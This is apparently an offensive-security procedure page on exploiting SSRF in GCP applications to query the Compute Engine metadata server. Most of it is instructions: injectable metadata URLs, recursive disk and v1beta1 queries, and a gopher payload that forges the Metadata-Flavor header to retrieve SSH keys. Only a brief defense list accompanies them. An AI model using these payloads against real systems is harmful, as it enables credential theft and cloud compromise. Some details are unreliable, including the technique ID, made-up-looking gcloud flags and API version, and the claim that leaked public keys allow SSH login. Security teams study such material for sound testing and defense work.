---
type: procedure
description: >-
  Exploit Server-Side Request Forgery (SSRF) vulnerabilities in Google Cloud
  Platform (GCP) applications to access the instance metadata server and
  retrieve sensitive information such as SSH keys, instance details, and disk
  metadata.
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[Collection]]'
  - '[[Initial Access]]'
techniques:
  - '[[T1528.001]]'
sub_techniques: []
tags:
  - ssrf
  - gcp
  - metadata-retrieval
  - server-side-request-forgery
  - ssrf-url-for-cloud-instances
  - ssrf-url-for-google-cloud
commands:
  - '[[commands/gopher-ssrf-fetch-ssh-keys-google-metadata]]'
  - '[[commands/request-google-instance-disks-metadata-recursive]]'
  - '[[commands/list-google-compute-metadata-urls]]'
platforms:
  - GCP
  - Web
tools: []
validated: true
---

# google-cloud-ssrf-metadata-retrieval

## Summary

This procedure demonstrates how to exploit a Server-Side Request Forgery (SSRF) vulnerability in a GCP-hosted application to force the server to request internal metadata endpoints. By crafting malicious URLs, including Gopher protocol payloads to set required headers like Metadata-Flavor: Google, attackers can retrieve sensitive instance metadata such as SSH keys, hostname, project ID, and attached disk information from the GCP metadata server (accessible at 169.254.169.254 or metadata.google.internal). This technique is particularly effective against applications that fetch external URLs without proper validation, allowing unauthorized access to cloud credentials and configuration data.

## Description

In GCP, the Compute Engine metadata server provides instance-specific information to running applications via HTTP endpoints at http://metadata.google.internal/computeMetadata/v1/ or the link-local IP 169.254.169.254. This includes service account tokens, SSH keys, network details, and custom attributes. SSRF vulnerabilities enable attackers to abuse this by tricking the vulnerable application into making requests to these internal endpoints on their behalf. Key challenges include setting the Metadata-Flavor header, which can be bypassed using the Gopher protocol to encode HTTP requests with custom headers. This procedure outlines crafting and injecting these payloads into vulnerable parameters (e.g., image URLs, webhooks). Successful exploitation can lead to credential theft, lateral movement within the cloud environment, or full instance compromise. It targets GCP Compute Engine instances and assumes the vulnerable app runs with sufficient privileges to access metadata.

## Requirements

1. Identification of an SSRF-vulnerable endpoint in a GCP-hosted application that allows internal network requests (e.g., via URL parameters in API calls or file imports).
2. Knowledge of the target's internal network structure, particularly access to the metadata server (requires the app to run on a GCP VM).
3. Tools for crafting and sending HTTP requests, such as Burp Suite or curl, to test and inject payloads.
4. The vulnerable application must not block link-local IPs (169.254.169.254) or internal hostnames like metadata.google.internal.

## Defense

- Disable access to the legacy metadata server by setting --metadata flags to disable in instance creation or using the Metadata Server API v2 with stricter authentication.
- Implement workload identity federation to avoid storing service account keys in metadata, and use OS Login instead of SSH keys.
- Validate and whitelist allowed URLs in the application, blocking internal IPs, localhost, and cloud metadata endpoints; use libraries like OWASP Java Encoder for input sanitization.
- Monitor for anomalous internal requests via VPC Flow Logs, Cloud Audit Logs, and network security groups; enable metadata hide flags (e.g., --no-metadata-access) for sensitive instances.
- Deploy Web Application Firewalls (WAF) like Cloud Armor to detect SSRF patterns, including Gopher protocol usage.

## Objectives

1. Retrieve instance-specific metadata, such as hostname, ID, and SSH keys, to understand the environment and steal credentials.
2. Access project-level information like project ID and service account tokens for broader cloud resource compromise.
3. Enumerate attached resources, including disks, to identify potential data stores or escalation paths.
4. Achieve persistence or lateral movement by exfiltrating metadata that enables SSH access or API calls.

## Instructions

### Step 1: Enumerate Available Metadata Endpoints

**Context**: Begin by identifying the standard GCP metadata URLs to target. These endpoints provide entry points for basic instance and project information. Use this list to craft initial SSRF payloads by injecting them into the vulnerable parameter (e.g., ?url= or image_src=). This step verifies accessibility without headers for simple endpoints.

**Command** ([[commands/list-google-compute-metadata-urls]]):

The following URLs can be used as payloads:

```bash
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

> Inject one of these URLs into the SSRF endpoint (e.g., via POST request to /fetch?url=<payload>). For endpoints requiring the Metadata-Flavor: Google header, proceed to later steps. This command lists the base paths; success is indicated by the server responding with JSON or text data about the instance.

### Step 2: Retrieve Instance Disk Metadata Recursively

**Context**: Target disk-related metadata to enumerate attached storage, which may contain sensitive data or configurations. Append ?recursive=true to fetch nested details like device names and sizes. This is useful for identifying persistent volumes that could be mounted or exfiltrated.

**Command** ([[commands/request-google-instance-disks-metadata-recursive]]):

```bash
http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
```

> Send this as an SSRF payload to the vulnerable app. If the endpoint requires authentication headers, use a Gopher-wrapped version (see Step 4). Expected output includes JSON with disk details, such as {"deviceName": "/dev/sda", "kind": "compute#disk", "type": "pd-standard"}. Verify by checking if the response leaks internal paths or sizes.

### Step 3: Access Beta Metadata Endpoints for Broader Enumeration

**Context**: Use the v1beta1 API version for additional metadata options, including recursive pulls without explicit flags in some cases. This step expands reconnaissance to cover more attributes like network interfaces or custom metadata set by the application.

Inline the following endpoints as SSRF payloads:

```bash
http://metadata.google.internal/computeMetadata/v1beta1/
http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
```

> These do not require the Metadata-Flavor header in beta mode, making them simpler to exploit. Inject into the SSRF parameter and observe the response for a tree of metadata (e.g., instance attributes, project numerical ID). Success confirms broader access; if blocked, fall back to v1 endpoints with header crafting.

### Step 4: Craft Gopher SSRF Payload to Fetch SSH Keys with Headers

**Context**: Many metadata endpoints require the Metadata-Flavor: Google header for authorization. Use the Gopher protocol to encode an HTTP GET request with this header, bypassing restrictions. This step targets SSH keys specifically, which can enable direct instance access.

**Code** ([[codes/gopher-ssrf-payload-for-ssh-keys-retrieval]]):

```powershell
gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a
```

**Command** ([[commands/gopher-ssrf-fetch-ssh-keys-google-metadata]]):

```bash
gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a
```

> URL-encode the Gopher string if needed and inject as the SSRF payload (e.g., ?redirect=<gopher_payload>). The server interprets it as an HTTP request to the metadata service. Expected output is a list of SSH public keys in the format user:ssh-rsa AAAAB3NzaC1yc2E... . If successful, extract keys for potential SSH logins; failure may indicate header blocking or non-Gopher support—test with tools like Burp Intruder for variations.
